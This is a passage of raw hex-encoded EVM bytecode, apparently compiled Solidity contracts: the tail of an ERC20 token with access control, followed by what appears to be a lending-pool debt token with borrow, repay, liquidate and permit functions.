865207a65726f2061646472657373000000000081525060200191505060405180910390fd5b61217a600083836127f6565b6121cb816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461204390919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156122b4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b6122c0600083836127f6565b6122d58160025461204390919063ffffffff16565b60028190555061232c816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461204390919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b6000612402826006600086815260200190815260200160002060000161282b90919063ffffffff16565b156124105760019050612411565b5b92915050565b6000612426836000018361285b565b60001c905092915050565b6000612459836000018373ffffffffffffffffffffffffffffffffffffffff1660001b6128de565b905092915050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156124e7576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526021815260200180612c116021913960400191505060405180910390fd5b6124f3826000836127f6565b61255e81604051806060016040528060228152602001612b29602291396000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611e5b9092919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506125b58160025461290190919063ffffffff16565b600281905550600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156126c8576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f45524332303a202066726f6d20746865207a65726f206164647265737300000081525060200191505060405180910390fd5b6126d4826000836127f6565b61275c816040518060400160405280601e81526020017f45524332303a2020616d6f756e7420657863656564732062616c616e636500008152506000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611e5b9092919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505050565b60006127b08260000161294b565b9050919050565b60006127e182600660008681526020019081526020016000206000016127fb90919063ffffffff16565b156127ef57600190506127f0565b5b92915050565b505050565b6000612823836000018373ffffffffffffffffffffffffffffffffffffffff1660001b61295c565b905092915050565b6000612853836000018373ffffffffffffffffffffffffffffffffffffffff1660001b6129cc565b905092915050565b6000818360000180549050116128bc576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180612ab56022913960400191505060405180910390fd5b8260000182815481106128cb57fe5b9060005260206000200154905092915050565b600080836001016000848152602001908152602001600020541415905092915050565b600061294383836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611e5b565b905092915050565b600081600001805490509050919050565b600061296883836128de565b6129c15782600001829080600181540180825580915050600190039060005260206000200160009091909190915055826000018054905083600101600084815260200190815260200160002081905550600190506129c6565b600090505b92915050565b60008083600101600084815260200190815260200160002054905060008114612aa85760006001820390506000600186600001805490500390506000866000018281548110612a1757fe5b9060005260206000200154905080876000018481548110612a3457fe5b9060005260206000200181905550600183018760010160008381526020019081526020016000208190555086600001805480612a6c57fe5b60019003818190600052602060002001600090559055866001016000878152602001908152602001600020600090556001945050505050612aae565b60009150505b9291505056fe456e756d657261626c655365743a20696e646578206f7574206f6620626f756e647345524332303a207472616e7366657220746f20746865207a65726f2061646472657373416363657373436f6e74726f6c3a2073656e646572206d75737420626520616e2061646d696e20746f206772616e7445524332303a206275726e20616d6f756e7420657863656564732062616c616e636545524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e6365416363657373436f6e74726f6c3a2073656e646572206d75737420626520616e2061646d696e20746f207265766f6b65416363657373436f6e74726f6c3a2073656e646572206d75737420626520616e2061646d696e45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a206275726e2066726f6d20746865207a65726f206164647265737345524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726f416363657373436f6e74726f6c3a2063616e206f6e6c792072656e6f756e636520726f6c657320666f722073656c66a264697066735822122050ef025d033c879f6fbe36172fe4f99741ccb6ee0d12baee0eff96961ab8d0be64736f6c63430006060033', '0x608060405234801561001057600080fd5b506004361061023d5760003560e01c80637c4950c71161013b578063cab364f1116100b8578063dde4bec01161007c578063dde4bec014610677578063e6abb5ae146106e5578063e6e0d75c1461070b578063ede4c0cc14610737578063f851a4401461073f5761023d565b8063cab364f1146105e0578063d505accf146105e8578063d8dfeb4514610639578063da284dcc14610641578063dd62ed3e146106495761023d565b8063a457c2d7116100ff578063a457c2d71461055b578063a9059cbb14610587578063b2bc5ef9146105b3578063bfa25308146105bb578063c5ebeaec146105c35761023d565b80637c4950c7146104dc5780637ecebe00146104e457806395d89b411461050a5780639dc29fac146105125780639e6ae5a01461053e5761023d565b80632608f818116101c9578063395093511161018d578063395093511461044e57806340c10f191461047a57806354fd4d50146104a65780636f307dc3146104ae57806370a08231146104b65761023d565b80632608f818146103ec57806330adf81f14610418578063313ce567146104205780633644e5151461043e578063392e53cd146104465761023d565b80631a0de6fa116102105780631a0de6fa146103365780631c2872aa1461033e5780631eabf00d1461036c57806322285cf61461039257806323b872dd146103b65761023d565b806306fdde0314610242578063095ea7b3146102bf5780630e752702146102ff57806318160ddd1461031c575b600080fd5b61024a610747565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561028457818101518382015260200161026c565b50505050905090810190601f1680156102b15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102eb600480360360408110156102d557600080fd5b506001600160a01b0381351690602001356107d5565b604080519115158252519081900360200190f35b6102eb6004803603602081101561031557600080fd5b50356107eb565b61032461092e565b60408051918252519081900360200190f35b610324610934565b61036a6004803603604081101561035457600080fd5b506001600160a01b03813516906020013561093a565b005b6102eb6004803603602081101561038257600080fd5b50356001600160a01b0316610d9d565b61039a610ecb565b604080516001600160a01b039092168252519081900360200190f35b6102eb600480360360608110156103cc57600080fd5b506001600160a01b03813581169160208101359091169060400135610edf565b6102eb6004803603604081101561040257600080fd5b506001600160a01b038135169060200135610f84565b6103246110ca565b6104286110ee565b6040805160ff9092168252519081900360200190f35b6103246110fe565b6102eb611104565b6102eb6004803603604081101561046457600080fd5b506001600160a01b03813516906020013561110d565b6102eb6004803603604081101561049057600080fd5b506001600160a01b0381351690602001356111a4565b61024a6112bf565b61039a6112dc565b610324600480360360208110156104cc57600080fd5b50356001600160a01b03166112eb565b61039a611306565b610324600480360360208110156104fa57600080fd5b50356001600160a01b0316611315565b61024a611327565b6102eb6004803603604081101561052857600080fd5b506001600160a01b038135169060200135611382565b61039a6004803603602081101561055457600080fd5b5035611487565b6102eb6004803603604081101561057157600080fd5b506001600160a01b0381351690602001356114b1565b6102eb6004803603604081101561059d57600080fd5b506001600160a01b038135169060200135611532565b61032461153f565b61036a611545565b6102eb600480360360208110156105d957600080fd5b50356115e9565b6102eb611df5565b61036a600480360360e08110156105fe57600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135611dfa565b61039a6120af565b6103246120be565b6103246004803603604081101561065f57600080fd5b506001600160a01b03813581169160200135166120c4565b61036a6004803603602081101561068d57600080fd5b810190602081018135600160201b8111156106a757600080fd5b8201836020820111156106b957600080fd5b803590602001918460208302840111600160201b831117156106da57600080fd5b5090925090506120ef565b61036a600480360360208110156106fb57600080fd5b50356001600160a01b03166123b6565b6102eb6004803603604081101561072157600080fd5b506001600160a01b0381351690602001356124cc565b61039a612a20565b61039a612a2f565b600c805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156107cd5780601f106107a2576101008083540402835291602001916107cd565b820191906000526020600020905b8154815290600101906020018083116107b057829003601f168201915b505050505081565b60006107e2338484612a43565b50600192915050565b6000805460408051632d3caa7360e21b815230600482015233602482018190529151919261010090046001600160a01b03169163b4f2a9cc91604480820192602092909190829003018186803b15801561084457600080fd5b505afa158015610858573d6000803e3d6000fd5b505050506040513d602081101561086e57600080fd5b50516108b6576040805162461bcd60e51b815260206004820152601260248201527122a9292fab20aaa62a2fa727aa2fa7a822a760711b604482015290519081900360640190fd5b60005460ff16610902576040805162461bcd60e51b815260206004820152601260248201527111549497d4915153951490539517d0d0531360721b604482015290519081900360640190fd5b6000805460ff19169055610917338085612b2f565b60019150506000805460ff19166001179055919050565b600e5481565b60075481565b600b5461010090046001600160a01b0316331461098e576040805162461bcd60e51b815260206004820152600d60248201526c22a9292fa727aa2fa0a226a4a760991b604482015290519081900360640190fd5b600b5460ff1615156001146109df576040805162461bcd60e51b815260206004820152601260248201527111549497d393d517d253925510531256915160721b604482015290519081900360640190fd5b60008111610a27576040805162461bcd60e51b815260206004820152601060248201526f4552525f5245434f5645525f5a45524f60801b604482015290519081900360640190fd5b6000826001600160a01b03166395d89b416040518163ffffffff1660e01b815260040160006040518083038186803b158015610a6257600080fd5b505afa158015610a76573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526020811015610a9f57600080fd5b8101908080516040519392919084600160201b821115610abe57600080fd5b908301906020820185811115610ad357600080fd5b8251600160201b811182820188101715610aec57600080fd5b82525081516020918201929091019080838360005b83811015610b19578181015183820152602001610b01565b50505050905090810190601f168015610b465780820380516001836020036101000a031916815260200191505b506040525050508051906020012090506000600a80549050905060005b81811015610d2757600a8181548110610b7857fe5b6000918252602090912001546001600160a01b03868116911614801590610ce45750600a8181548110610ba757fe5b6000918252602082200154604080516395d89b4160e01b815290516001600160a01b03909216926395d89b4192600480840193829003018186803b158015610bee57600080fd5b505afa158015610c02573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526020811015610c2b57600080fd5b8101908080516040519392919084600160201b821115610c4a57600080fd5b908301906020820185811115610c5f57600080fd5b8251600160201b811182820188101715610c7857600080fd5b82525081516020918201929091019080838360005b83811015610ca5578181015183820152602001610c8d565b50505050905090810190601f168015610cd25780820380516001836020036101000a031916815260200191505b50604052505050805190602001208314155b610d1f5760405162461bcd60e51b81526004018080602001828103825260218152602001806137916021913960400191505060405180910390fd5b600101610b63565b50600b54610d47906001600160a01b038681169161010090041685612ee9565b600b54604080516001600160a01b03878116825260208201879052825161010090940416927ff6891c84a6c6af32a6d052172a8acc4c631b1d5057ffa2bc1da268b6938ea2da929181900390910190a250505050565b600b5460009061010090046001600160a01b03163314610df4576040805162461bcd60e51b815260206004820152600d60248201526c22a9292fa727aa2fa0a226a4a760991b604482015290519081900360640190fd5b816001600160a01b03166358f25c506040518163ffffffff1660e01b815260040160206040518083038186803b158015610e2d57600080fd5b505afa158015610e41573d6000803e3d6000fd5b505050506040513d6020811015610e5757600080fd5b5050600480546001600160a01b038481166001600160a01b031983168117909355600b546040805193831680855260208501959095528051610100909204909216927f05f5eff078a94c026377ab6c6bdc6d2ad1932a3e4971fd7473348af3609ec57a92908290030190a250600192915050565b60005461010090046001600160a01b031681565b6000610eec848484612f40565b6001600160a01b0384166000908152600f602090815260408083203384529091528120548190610f1c90856130e6565b90925090506000826004811115610f2f57fe5b14610f6b5760405162461bcd60e51b815260040180806020018281038252602e8152602001806137f7602e913960400191505060405180910390fd5b610f76863383612a43565b6001925050505b9392505050565b6000805460408051632d3caa7360e21b81523060048201526001600160a01b0386811660248301529151869361010090049092169163b4f2a9cc91604480820192602092909190829003018186803b158015610fdf57600080fd5b505afa158015610ff3573d6000803e3d6000fd5b505050506040513d602081101561100957600080fd5b5051611051576040805162461bcd60e51b815260206004820152601260248201527122a9292fab20aaa62a2fa727aa2fa7a822a760711b604482015290519081900360640190fd5b60005460ff1661109d576040805162461bcd60e51b815260206004820152601260248201527111549497d4915153951490539517d0d0531360721b604482015290519081900360640190fd5b6000805460ff191690556110b2338585612b2f565b60019150506000805460ff1916600117905592915050565b7ffc77c2b9d30fe91687fd39abb7d16fcdfe1472d065740051ab8b13e4bf4a617f81565b600b54600160a81b900460ff1681565b60085481565b600b5460ff1681565b336000908152600f602090815260408083206001600160a01b03861684529091528120548190819061113f908561310c565b9092509050600082600481111561115257fe5b1461118e5760405162461bcd60e51b81526004018080602001828103825260258152602001806138756025913960400191505060405180910390fd5b611199338683612a43565b506001949350505050565b6000805460ff166111f1576040805162461bcd60e51b815260206004820152601260248201527111549497d4915153951490539517d0d0531360721b604482015290519081900360640190fd5b6000805460ff191690556005546001600160a01b0316331461125a576040805162461bcd60e51b815260206004820152601760248201527f4552525f4d494e545f4e4f545f415554484f52495a4544000000000000000000604482015290519081900360640190fd5b6000821161129f576040805162461bcd60e51b815260206004820152600d60248201526c4552525f4d494e545f5a45524f60981b604482015290519081900360640190fd5b6112a98383613132565b5060016000805460ff1916600117905592915050565b604051806040016040528060018152602001603160f81b81525081565b6006546001600160a01b031681565b6001600160a01b031660009081526010602052604090205490565b6005546001600160a01b031681565b60096020526000908152604090205481565b600d805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156107cd5780601f106107a2576101008083540402835291602001916107cd565b6000805460ff166113cf576040805162461bcd60e51b815260206004820152601260248201527111549497d4915153951490539517d0d0531360721b604482015290519081900360640190fd5b6000805460ff191690556005546001600160a01b03163314611438576040805162461bcd60e51b815260206004820152601760248201527f4552525f4255524e5f4e4f545f415554484f52495a4544000000000000000000604482015290519081900360640190fd5b6000821161147d576040805162461bcd60e51b815260206004820152600d60248201526c4552525f4255524e5f5a45524f60981b604482015290519081900360640190fd5b6112a98383613280565b600a818154811061149757600080fd5b6000918252602090912001546001600160a01b0316905081565b336000908152600f602090815260408083206001600160a01b0386168452909152812054819081906114e390856130e6565b909250905060008260048111156114f657fe5b1461118e5760405162461bcd60e51b815260040180806020018281038252602681526020018061376b6026913960400191505060405180910390fd5b60006107e2338484612f40565b60025481565b600b5461010090046001600160a01b03163314611599576040805162461bcd60e51b815260206004820152600d60248201526c22a9292fa727aa2fa0a226a4a760991b604482015290519081900360640190fd5b600b5460405160009161010090046001600160a01b0316907fbdd36143ee09de60bdefca70680e0f71189b2ed7acee364b53917ad433fdaf80908390a3600b8054610100600160a81b0319169055565b6000805460408051632d3caa7360e21b815230600482015233602482018190529151919261010090046001600160a01b03169163b4f2a9cc91604480820192602092909190829003018186803b15801561164257600080fd5b505afa158015611656573d6000803e3d6000fd5b505050506040513d602081101561166c57600080fd5b50516116b4576040805162461bcd60e51b815260206004820152601260248201527122a9292fab20aaa62a2fa727aa2fa7a822a760711b604482015290519081900360640190fd5b60005460ff16611700576040805162461bcd60e51b815260206004820152601260248201527111549497d4915153951490539517d0d0531360721b604482015290519081900360640190fd5b6000805460ff19169055611712613664565b61171a6133ce565b1561175f576040805162461bcd60e51b815260206004820152601060248201526f11549497d093d39117d350551554915160821b604482015290519081900360640190fd5b600084116117a6576040805162461bcd60e51b815260206004820152600f60248201526e4552525f424f52524f575f5a45524f60881b604482015290519081900360640190fd5b60048054604080516381a7bc9760e01b81523093810193909352516001600160a01b03909116916381a7bc97916024808301926020929190829003018186803b1580156117f257600080fd5b505afa158015611806573d6000803e3d6000fd5b505050506040513d602081101561181c57600080fd5b5051611868576040805162461bcd60e51b815260206004820152601660248201527511549497d093d49493d5d7d393d517d0531313d5d15160521b604482015290519081900360640190fd5b611874600e548561310c565b60a083018190528282600481111561188857fe5b600481111561189357fe5b90525060009050815160048111156118a757fe5b146118f1576040805162461bcd60e51b815260206004820152601560248201527422a9292fa127a92927abafa6a0aa242fa2a92927a960591b604482015290519081900360640190fd5b600480546040805163d010b00f60e01b81523093810193909352516001600160a01b039091169163d010b00f916024808301926020929190829003018186803b15801561193d57600080fd5b505afa158015611951573d6000803e3d6000fd5b505050506040513d602081101561196757600080fd5b50516040820181905260a082015111156119c8576040805162461bcd60e51b815260206004820181905260248201527f4552525f424f52524f575f444542545f4345494c494e475f4f564552464c4f57604482015290519081900360640190fd5b6000546040805163bbd7edc560e01b815230600482015233602482015290516101009092046001600160a01b03169163bbd7edc591604480820192608092909190829003018186803b158015611a1d57600080fd5b505afa158015611a31573d6000803e3d6000fd5b505050506040513d6080811015611a4757600080fd5b508051604090910151606083018190526020830191909152611a9a5760405162461bcd60e51b81526004018080602001828103825260218152602001806139916021913960400191505060405180910390fd5b611aa881602001518561310c565b60c0830181905282826004811115611abc57fe5b6004811115611ac757fe5b9052506000905081516004811115611adb57fe5b14611b25576040805162461bcd60e51b815260206004820152601560248201527422a9292fa127a92927abafa6a0aa242fa2a92927a960591b604482015290519081900360640190fd5b600054606082015160c08301516040805163d8e51dfb60e01b815230600482015233602482015260448101939093526064830191909152516101009092046001600160a01b03169163d8e51dfb91608480820192602092909190829003018186803b158015611b9357600080fd5b505afa158015611ba7573d6000803e3d6000fd5b505050506040513d6020811015611bbd57600080fd5b50516080820152600480546040805163351da44160e21b81523093810193909352516001600160a01b039091169163d4769104916024808301926020929190829003018186803b158015611c1057600080fd5b505afa158015611c24573d6000803e3d6000fd5b505050506040513d6020811015611c3a57600080fd5b505160e0820181905260808201511015611c855760405162461bcd60e51b81526004018080602001828103825260218152602001806136f96021913960400191505060405180910390fd5b611c8f3385613132565b6000805460c083015160408051630b9d2cc360e41b81523060048201523360248201526044810192909252516101009092046001600160a01b03169263b9d2cc30926064808401936020939083900390910190829087803b158015611cf357600080fd5b505af1158015611d07573d6000803e3d6000fd5b505050506040513d6020811015611d1d57600080fd5b5051611d70576040805162461bcd60e51b815260206004820152601e60248201527f4552525f424f52524f575f43414c4c5f5345545f5641554c545f444542540000604482015290519081900360640190fd5b60408051858152905133917fcbc04eca7e9da35cb1393a6135a199ca52e450d5e9251cbd99f7847d33a36750919081900360200190a2604080518581529051339130917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a36001925050506000805460ff19166001179055919050565b600181565b6001600160a01b038716611e3f5760405162461bcd60e51b81526004018080602001828103825260238152602001806136d66023913960400191505060405180910390fd5b6001600160a01b038616611e845760405162461bcd60e51b81526004018080602001828103825260258152602001806138e16025913960400191505060405180910390fd5b42841015611ed9576040805162461bcd60e51b815260206004820152601860248201527f4552525f45524332305f5045524d49545f455850495245440000000000000000604482015290519081900360640190fd5b6001600160a01b0380881660008181526009602090815260408083208054600180820190925582517ffc77c2b9d30fe91687fd39abb7d16fcdfe1472d065740051ab8b13e4bf4a617f8186015280840196909652958c166060860152608085018b905260a085019590955260c08085018a90528151808603909101815260e08501825280519083012060085461190160f01b61010087015261010286015261012280860182905282518087039091018152610142860180845281519185019190912090859052610162860180845281905260ff8a166101828701526101a286018990526101c2860188905291519095919491926101e2808401939192601f1981019281900390910190855afa158015611ff6573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b0381166120485760405162461bcd60e51b815260040180806020018281038252602d81526020018061373e602d913960400191505060405180910390fd5b896001600160a01b0316816001600160a01b0316146120985760405162461bcd60e51b815260040180806020018281038252602281526020018061394d6022913960400191505060405180910390fd5b6120a38a8a8a612a43565b50505050505050505050565b6001546001600160a01b031681565b60035481565b6001600160a01b039182166000908152600f6020908152604080832093909416825291909152205490565b600b5461010090046001600160a01b03163314612143576040805162461bcd60e51b815260206004820152600d60248201526c22a9292fa727aa2fa0a226a4a760991b604482015290519081900360640190fd5b600b5460ff161561218c576040805162461bcd60e51b815260206004820152600e60248201526d11549497d253925510531256915160921b604482015290519081900360640190fd5b8060005b81811015612329578383828181106121a457fe5b905060200201356001600160a01b03166001600160a01b03166395d89b416040518163ffffffff1660e01b815260040160006040518083038186803b1580156121ec57600080fd5b505afa158015612200573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052602081101561222957600080fd5b8101908080516040519392919084600160201b82111561224857600080fd5b90830190602082018581111561225d57600080fd5b8251600160201b81118282018810171561227657600080fd5b82525081516020918201929091019080838360005b838110156122a357818101518382015260200161228b565b50505050905090810190601f1680156122d05780820380516001836020036101000a031916815260200191505b5060405250505050600a8484838181106122e657fe5b835460018181018655600095865260209586902090910180546001600160a01b0319166001600160a01b0396909302949094013594909416179091555001612190565b50600b8054600160ff1990911617908190556040805160208082528082018690526101009093046001600160a01b0316927fd877543bef27da9036243421e623413c8fdd78d7d183cc93d8f3cddbd657a2ed928792879290918291908201908590850280828437600083820152604051601f909101601f19169092018290039550909350505050a2505050565b600b5461010090046001600160a01b0316331461240a576040805162461bcd60e51b815260206004820152600d60248201526c22a9292fa727aa2fa0a226a4a760991b604482015290519081900360640190fd5b6001600160a01b038116612465576040805162461bcd60e51b815260206004820152601a60248201527f4552525f5345545f41444d494e5f5a45524f5f41444452455353000000000000604482015290519081900360640190fd5b600b546040516001600160a01b0380841692610100900416907fbdd36143ee09de60bdefca70680e0f71189b2ed7acee364b53917ad433fdaf8090600090a3600b80546001600160a01b0390921661010002610100600160a81b0319909216919091179055565b6000805460408051632d3caa7360e21b81523060048201526001600160a01b0386811660248301529151869361010090049092169163b4f2a9cc91604480820192602092909190829003018186803b15801561252757600080fd5b505afa15801561253b573d6000803e3d6000fd5b505050506040513d602081101561255157600080fd5b5051612599576040805162461bcd60e51b815260206004820152601260248201527122a9292fab20aaa62a2fa727aa2fa7a822a760711b604482015290519081900360640190fd5b60005460ff166125e5576040805162461bcd60e51b815260206004820152601260248201527111549497d4915153951490539517d0d0531360721b604482015290519081900360640190fd5b6000805460ff191690556125f76136aa565b336001600160a01b0386161415612655576040805162461bcd60e51b815260206004820152601960248201527f4552525f4c49515549444154455f424f52524f575f53454c4600000000000000604482015290519081900360640190fd5b600084116126aa576040805162461bcd60e51b815260206004820152601960248201527f4552525f4c49515549444154455f424f52524f575f5a45524f00000000000000604482015290519081900360640190fd5b6004805460408051632ec8fffb60e21b81523093810193909352516001600160a01b039091169163bb23ffec916024808301926020929190829003018186803b1580156126f657600080fd5b505afa15801561270a573d6000803e3d6000fd5b505050506040513d602081101561272057600080fd5b5051612773576040805162461bcd60e51b815260206004820181905260248201527f4552525f4c49515549444154455f424f52524f575f4e4f545f414c4c4f574544604482015290519081900360640190fd5b61277b6133ce565b61285e5760005460408051639ee91d1f60e01b81523060048201526001600160a01b038881166024830152915161010090930490911691639ee91d1f91604480820192602092909190829003018186803b1580156127d857600080fd5b505afa1580156127ec573d6000803e3d6000fd5b505050506040513d602081101561280257600080fd5b505115156060820181905261285e576040805162461bcd60e51b815260206004820152601a60248201527f4552525f4143434f554e545f4e4f545f554e4445525741544552000000000000604482015290519081900360640190fd5b612869338686612b2f565b600080546040805163464b048560e01b81523060048201526024810188905290516101009092046001600160a01b03169163464b048591604480820192602092909190829003018186803b1580156128c057600080fd5b505afa1580156128d4573d6000803e3d6000fd5b505050506040513d60208110156128ea57600080fd5b50516000805460408051630e496ef360e01b81523060048201523360248201526001600160a01b038b811660448301526064820186905291519495506101009092041692630e496ef392608480840193602093929083900390910190829087803b15801561295757600080fd5b505af115801561296b573d6000803e3d6000fd5b505050506040513d602081101561298157600080fd5b50516129be5760405162461bcd60e51b815260040180806020018281038252602b815260200180613825602b913960400191505060405180910390fd5b604080518681526020810183905281516001600160a01b0389169233927f08b197b6ae66d18ee6fa20a826a84579a925b9e646a3bf19e96f59ed568c2688929081900390910190a3600193505050506000805460ff1916600117905592915050565b6004546001600160a01b031681565b600b5461010090046001600160a01b031681565b6001600160a01b038316612a885760405162461bcd60e51b81526004018080602001828103825260238152602001806139dd6023913960400191505060405180910390fd5b6001600160a01b038216612acd5760405162461bcd60e51b81526004018080602001828103825260218152602001806137b26021913960400191505060405180910390fd5b6001600160a01b038084166000818152600f6020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b60008111612b7c576040805162461bcd60e51b81526020600482015260156024820152744552525f52455041595f424f52524f575f5a45524f60581b604482015290519081900360640190fd5b600480546040805163e60f077360e01b81523093810193909352516001600160a01b039091169163e60f0773916024808301926020929190829003018186803b158015612bc857600080fd5b505afa158015612bdc573d6000803e3d6000fd5b505050506040513d6020811015612bf257600080fd5b5051612c45576040805162461bcd60e51b815260206004820152601c60248201527f4552525f52455041595f424f52524f575f4e4f545f414c4c4f57454400000000604482015290519081900360640190fd5b6000805460408051638a0695fd60e01b81523060048201526001600160a01b038681166024830152915161010090930490911691638a0695fd91604480820192602092909190829003018186803b158015612c9f57600080fd5b505afa158015612cb3573d6000803e3d6000fd5b505050506040513d6020811015612cc957600080fd5b5051905081811015612d0c5760405162461bcd60e51b81526004018080602001828103825260228152602001806138bf6022913960400191505060405180910390fd5b81612d16856112eb565b1015612d535760405162461bcd60e51b815260040180806020018281038252602581526020018061389a6025913960400191505060405180910390fd5b612d5d8483613280565b600080612d6a83856130e6565b90925090506000826004811115612d7d57fe5b14612d8457fe5b6000805460408051630b9d2cc360e41b81523060048201526001600160a01b0389811660248301526044820186905291516101009093049091169263b9d2cc30926064808401936020939083900390910190829087803b158015612de757600080fd5b505af1158015612dfb573d6000803e3d6000fd5b505050506040513d6020811015612e1157600080fd5b5051612e4e5760405162461bcd60e51b81526004018080602001828103825260248152602001806139066024913960400191505060405180910390fd5b60408051858152905130916001600160a01b038916917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a3846001600160a01b0316866001600160a01b03167fa9a154237a69922f8860321d1fec1624a5dbe8a8af89a3dd3d7a759f6c8080d88684604051808381526020018281526020019250505060405180910390a3505050505050565b604080516001600160a01b038416602482015260448082018490528251808303909101815260649091019091526020810180516001600160e01b031663a9059cbb60e01b179052612f3b9084906133d7565b505050565b6001600160a01b038316612f855760405162461bcd60e51b81526004018080602001828103825260248152602001806137d36024913960400191505060405180910390fd5b6001600160a01b038216612fca5760405162461bcd60e51b815260040180806020018281038252602281526020018061396f6022913960400191505060405180910390fd5b6001600160a01b03831660009081526010602052604081205481908190612ff190856130e6565b9093509150600083600481111561300457fe5b146130405760405162461bcd60e51b815260040180806020018281038252602b8152602001806139b2602b913960400191505060405180910390fd5b6001600160a01b038087166000908152601060205260408082208590559187168152205461306e908561310c565b9093509050600083600481111561308157fe5b1461308857fe5b6001600160a01b038086166000818152601060209081526040918290208590558151888152915192938a16927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a3505050505050565b6000808383116130fd575060009050818303613105565b506003905060005b9250929050565b60008083830184811061312457600092509050613105565b600260009250925050613105565b6001600160a01b03821660009081526010602052604081205481908190613159908561310c565b9093509150600083600481111561316c57fe5b146131be576040805162461bcd60e51b815260206004820152601f60248201527f4552525f45524332305f4d494e545f42414c414e43455f4f564552464c4f5700604482015290519081900360640190fd5b6001600160a01b0385166000908152601060205260409020829055600e546131e6908561310c565b909350905060008360048111156131f957fe5b146132355760405162461bcd60e51b815260040180806020018281038252602481526020018061371a6024913960400191505060405180910390fd5b600e8190556040805185815290516001600160a01b038716917f0f6798a560793a54c3bcfe86a93cde1e73087d944c0ea20544137d4121396885919081900360200190a25050505050565b6001600160a01b038216600090815260106020526040812054819081906132a790856130e6565b909350915060008360048111156132ba57fe5b1461330c576040805162461bcd60e51b815260206004820181905260248201527f4552525f45524332305f4255524e5f42414c414e43455f554e444552464c4f57604482015290519081900360640190fd5b6001600160a01b0385166000908152601060205260409020829055600e5461333490856130e6565b9093509050600083600481111561334757fe5b146133835760405162461bcd60e51b81526004018080602001828103825260258152602001806138506025913960400191505060405180910390fd5b600e8190556040805185815290516001600160a01b038716917fcc16f5dbb4873280815c1ee09dbd06736cffcc184412cf7a71a0fdb75d397ca5919081900360200190a25050505050565b60035442101590565b606061341983836040518060400160405280601d81526020017f4552525f534146455f45524332305f4c4f575f4c4556454c5f43414c4c00000081525061348b565b805190915015612f3b5780806020019051602081101561343857600080fd5b5051612f3b576040805162461bcd60e51b815260206004820152601e60248201527f4552525f534146455f45524332305f45524332305f4f5045524154494f4e0000604482015290519081900360640190fd5b606061349f846001600160a01b0316613628565b6134da5760405162461bcd60e51b815260040180806020018281038252602381526020018061392a6023913960400191505060405180910390fd5b60006060856001600160a01b0316856040518082805190602001908083835b602083106135185780518252601f1990920191602091820191016134f9565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d806000811461357a576040519150601f19603f3d011682016040523d82523d6000602084013e61357f565b606091505b50915091508115613593579150610f7d9050565b8051156135a35780518082602001fd5b8360405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b838110156135ed5781810151838201526020016135d5565b50505050905090810190601f16801561361a5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b6000813f7fc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a47081811480159061365c57508115155b949350505050565b6040805161010081019091528060008152602001600081526020016000815260200160008152602001600081526020016000815260200160008152602001600081525090565b604080516080810190915280600081526020016000815260200160008152602001600015158152509056fe4552525f45524332305f